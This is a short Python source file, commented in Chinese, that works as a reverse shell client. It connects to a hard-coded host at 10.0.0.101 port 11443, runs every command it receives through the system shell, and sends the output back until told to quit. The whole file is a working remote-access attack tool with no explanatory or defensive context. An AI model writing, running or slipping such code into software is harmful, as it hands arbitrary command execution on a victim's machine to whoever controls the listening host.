# coding: utf8

import socket,subprocess

# 设置服务器的IP地址与端口
HOST = '10.0.0.101'
PORT = 11443

# 创建 socket 对象
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
#s.send('[*] Connection Established!')

while 1:
    data = s.recv(1024)
    if data == "quit": break
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_value)

s.close()
